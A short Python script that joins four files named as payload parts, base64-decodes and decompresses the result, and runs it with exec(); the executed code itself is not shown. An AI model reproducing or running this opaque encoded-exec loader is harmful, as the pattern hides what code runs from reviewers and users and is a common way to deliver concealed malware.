from pathlib import Path
from base64 import b64decode
from zlib import decompress

ROOT = Path(__file__).parent
payload = "".join(
    (ROOT / f"v18_project_pulse_alpha19_payload_{i}.txt").read_text().strip()
    for i in range(1, 5)
)
exec(decompress(b64decode(payload)).decode("utf-8"))
